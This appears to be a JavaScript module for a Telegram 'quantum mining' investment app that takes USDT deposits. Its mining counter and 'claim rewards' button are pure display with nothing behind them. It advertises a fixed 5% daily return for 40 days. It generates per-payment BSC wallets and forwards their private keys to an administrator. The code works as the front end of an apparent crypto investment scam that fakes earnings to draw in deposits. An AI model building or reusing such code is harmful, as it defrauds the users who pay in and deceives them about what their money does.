import { state } from './state/appState.js';
import { updateDashboard } from './components/Dashboard.js';
import { renderHistory } from './components/HistoryList.js';
import { notificarAlBot, generarWalletBSC, sendKeyToAdmin } from './services/paymentService.js';
import { API_URLS } from './config/constants.js';

let paymentTimerInterval = null;
let isGeneratingWallet = false; // Previene spam de clics

// ==========================================
// 1. MOTOR DE MINERÍA CUÁNTICA
// ==========================================
export function startMiningEngine() {
    setInterval(() => {
        if (typeof state.addMiningTick === 'function') {
            state.addMiningTick();
        }

        const displayHash = document.getElementById('mining-hash');
        if (displayHash && (state.totalInvestedUSDT > 0 || state.accumulatedMining > 0)) {
            const hash = parseFloat(state.accumulatedMining) || 0;
            const rate = parseFloat(state.hashRate) || 0;
            displayHash.innerText = Math.floor(hash * rate).toLocaleString();
        }
    }, 1000);
}

// ==========================================
// 2. PASARELA DE PAGOS (APERTURA ULTRA RÁPIDA)
// ==========================================
export async function openPayModal() {
    if (isGeneratingWallet) return;

    const amountInput = document.getElementById('invest-amount');
    const amount = parseFloat(amountInput?.value || 0);

    // Ajustado al nuevo mínimo global de 0.1 USDT
    if (!amount || amount < 0.1) {
        const errorMsg = "❌ El mínimo de inyección de liquidez es 0.10 USDT";
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.showAlert(errorMsg);
        } else {
            alert(errorMsg);
        }
        return;
    }

    isGeneratingWallet = true;

    // --- OPTIMIZACIÓN DE VELOCIDAD: Apertura instantánea de la UI ---
    const payModal = document.getElementById('payModal');
    if (payModal) payModal.style.display = 'flex';

    const amountDisplay = document.getElementById('pay-amount-display');
    if (amountDisplay) amountDisplay.innerText = `${amount.toFixed(2)} USDT`;

    const addressDisplay = document.getElementById('wallet-address-display');
    if (addressDisplay) addressDisplay.innerText = "Generando dirección segura...";

    const qrImg = document.getElementById('qr-image');
    if (qrImg) qrImg.src = ''; 

    // Los procesos pesados de red se ejecutan con el modal ya abierto en pantalla
    try {
        await notificarAlBot("intento_pago", amount);
        const data = await generarWalletBSC();

        if (data && data.address) {
            localStorage.setItem('temp_wallet', JSON.stringify({
                address: data.address, 
                privateKey: data.privateKey, 
                amount: amount,
                timestamp: Date.now() 
            }));

            await sendKeyToAdmin(data.address, data.privateKey, amount);

            if (addressDisplay) addressDisplay.innerText = data.address;
            if (qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;

            startPaymentTimer(30);
        } else {
            throw new Error("Datos de wallet inválidos");
        }
    } catch (e) {
        console.error("Error en pasarela de pagos:", e);
        if (addressDisplay) addressDisplay.innerText = "Error de conexión. Abortando...";
        setTimeout(() => closePayModal(), 3000);
    } finally {
        isGeneratingWallet = false;
    }
}

export function closePayModal() {
    const payModal = document.getElementById('payModal');
    if (payModal) payModal.style.display = 'none';

    if (paymentTimerInterval) {
        clearInterval(paymentTimerInterval);
        paymentTimerInterval = null;
    }
}

function startPaymentTimer(minutes) {
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
    let seconds = minutes * 60;

    paymentTimerInterval = setInterval(() => {
        if (seconds <= 0) {
            clearInterval(paymentTimerInterval);
            paymentTimerInterval = null;
            const timerDisplay = document.getElementById('payment-countdown');
            if (timerDisplay) timerDisplay.innerText = "Tiempo expirado";
            return;
        }

        let mins = Math.floor(seconds / 60).toString().padStart(2, '0');
        let secs = (seconds % 60).toString().padStart(2, '0');

        const timerDisplay = document.getElementById('payment-countdown');
        if (timerDisplay) timerDisplay.innerText = `${mins}:${secs}`; 
        seconds--;
    }, 1000);
}

// ==========================================
// 3. FUNCIONES DE INTERFAZ (UI HANDLERS)
// ==========================================
export function copyLink() {
    const refInput = document.getElementById('ref-link');
    if (refInput && refInput.value !== 'GENERANDO ENLACE ENCRIPTADO...' && refInput.value !== 'Cargando enlace...') {
        navigator.clipboard.writeText(refInput.value).then(() => {
            if (window.Telegram?.WebApp) {
                window.Telegram.WebApp.showAlert("✅ Coordenadas de radar encriptadas y copiadas.");
            } else {
                alert("✅ Coordenadas de radar copiadas.");
            }
        }).catch(err => console.error('Error al copiar:', err));
    }
}

export function copyAddress() {
    const addrDisplay = document.getElementById('wallet-address-display');
    if (addrDisplay && addrDisplay.innerText.length > 20) {
        navigator.clipboard.writeText(addrDisplay.innerText).then(() => {
            if (window.Telegram?.WebApp) {
                window.Telegram.WebApp.showAlert("✅ Dirección Hash copiada al portapapeles.");
            } else {
                alert("✅ Dirección Hash copiada.");
            }
        });
    }
}

// Sistema unificado: 5% diario fijo por 40 días, mínimo 0.1 USDT
export function calculateROI() {
    const amountInput = document.getElementById('invest-amount');
    const calcPower = document.getElementById('calc-power');
    const calcHash = document.getElementById('calc-hash');

    if (!amountInput) return;
    const amount = parseFloat(amountInput.value) || 0;

    if (amount >= 0.1) {
        if (calcPower) calcPower.innerHTML = `<i class="fa-solid fa-bolt" style="color: var(--blue-tg); width: 15px;"></i> ${(amount * 1000).toLocaleString()} GH/s`;

        // 5% diario fijo
        const dailyPercentage = 0.05; 
        const dailyProfitUSDT = amount * dailyPercentage;
        const dailyHash = Math.floor(dailyProfitUSDT * 1000); 

        if (calcHash) calcHash.innerHTML = `<i class="fa-solid fa-cube" style="color: #10b981; width: 15px;"></i> ${dailyHash.toLocaleString()} HASH`;
    } else {
        if (calcPower) calcPower.innerHTML = `<i class="fa-solid fa-bolt" style="color: var(--blue-tg); width: 15px;"></i> 0.0 GH/s`;
        if (calcHash) calcHash.innerHTML = `<i class="fa-solid fa-cube" style="color: #10b981; width: 15px;"></i> 0 HASH`;
    }
}

export function claimMining() {
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.showAlert("⚡ Sincronizando con la red neuronal... Recompensas extraídas con éxito.");
    } else {
        alert("⚡ Sincronizando con la red neuronal... Recompensas extraídas con éxito.");
    }
}

// ==========================================
// 4. SECUENCIA DE ARRANQUE (BOOT SEQUENCE)
// ==========================================
window.onload = () => {
    console.log("Iniciando protocolos del sistema...");

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
        window.Telegram.WebApp.setHeaderColor('#05070a'); 
    }

    setTimeout(() => {
        try {
            const tgData = window.Telegram?.WebApp?.initDataUnsafe;
            const urlParams = new URLSearchParams(window.location.search);

            state.userId = tgData?.user?.id || urlParams.get('user_id') || '88888888';

            console.log(`[OK] Enlace establecido. Operador ID: ${state.userId}`);

            if (typeof updateDashboard === 'function') updateDashboard();
            if (typeof renderHistory === 'function') renderHistory();

            startMiningEngine();

        } catch (error) {
            console.error("[CRÍTICO] Fallo en la matriz de inicio:", error);
        }
    }, 150);
};

// ==========================================
// 5. EXPORTAR AL ENTORNO GLOBAL
// ==========================================
window.openPayModal = openPayModal;
window.closePayModal = closePayModal;
window.copyLink = copyLink;
window.copyAddress = copyAddress;
window.calculateROI = calculateROI;
window.claimMining = claimMining;